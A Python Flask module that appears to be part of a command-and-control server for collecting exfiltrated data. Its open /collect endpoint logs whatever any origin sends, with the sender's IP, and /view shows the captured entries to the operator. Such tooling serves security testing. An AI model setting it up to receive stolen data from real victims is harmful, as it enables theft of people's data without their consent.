import sqlite3
from datetime import datetime
from json import loads
from time import time
from uuid import uuid4

from __main__ import app
from flask import (
    make_response,
    render_template,
    request,
    session,
)

from .support import check_auth


@app.route("/collect/<id>", methods=["GET", "POST"])
def collect(id):
    connection = sqlite3.connect("db/c2.db")
    cursor = connection.cursor()
    try:
        owner = cursor.execute(
            """SELECT uuid FROM users WHERE identifier = ?""", (id,)
        ).fetchall()[0][0]
    except IndexError as e:
        print(e)
        owner = "admin"
    if request.method == "GET":
        cursor.execute(
            """INSERT INTO data (uuid, time_stamp, remote_ip, method, received, owner) VALUES (?, ?, ?, ?, ? ,?);""",
            (
                str(uuid4()),
                str(datetime.fromtimestamp(time()).strftime("%Y-%m-%d %H:%M:%S")),
                str(request.remote_addr),
                "GET",
                "&".join(
                    "%s%s%s"
                    % (k, "=" if request.values[k] != "" else "", request.values[k])
                    for k in request.values
                ),
                owner,
            ),
        )

    elif request.method == "POST":
        match request.headers.get(
            "content-type"
        ).split(';')[0]:  # Add other content-types to this as needed
            case "application/json":
                data = loads(request.json)
                data = str("".join("%s: %s" % (k, data[k]) for k in data))
            case "multipart/form-data":
                data = request.form
                data = " | ".join([i + ' : ' + data[i] for i in data])
            case _:
                data = request.data

        cursor.execute(
            """INSERT INTO data (uuid, time_stamp, remote_ip, method, received, owner) VALUES (?, ?, ?, ?, ?, ?);""",
            (
                str(uuid4()),
                str(datetime.fromtimestamp(time()).strftime("%Y-%m-%d %H:%M:%S")),
                str(request.remote_addr),
                "POST",
                data,
                owner,
            ),
        )

    resp = make_response()
    resp.status = "200"
    connection.commit()
    connection.close()
    resp.headers["C2"] = "C2 Server has received your data :)"
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.route("/clear", methods=["POST"])
@check_auth
def clear():
    connection = sqlite3.connect("db/c2.db")
    cursor = connection.cursor()
    owner = cursor.execute(
        """SELECT uuid FROM users WHERE username = ?;""", (session["name"],)
    ).fetchall()[0][0]
    cursor.execute("""DELETE FROM data WHERE owner = ? """, (owner,))
    connection.commit()
    connection.close()
    resp = make_response()
    resp.status = "302"
    resp.headers["Location"] = "/view"
    return resp


@app.route("/view", methods=["GET"])
@check_auth
def view():
    connection = sqlite3.connect("db/c2.db")
    cursor = connection.cursor()
    owner = cursor.execute(
        """SELECT uuid FROM users WHERE username = ?;""", (session["name"],)
    ).fetchall()[0][0]
    data = cursor.execute(
        """SELECT time_stamp, remote_ip, method, received FROM data WHERE owner = ?""",
        (owner,),
    ).fetchall()
    connection.commit()
    connection.close()
    return render_template("C2_received.html", content=data, name=session["name"])
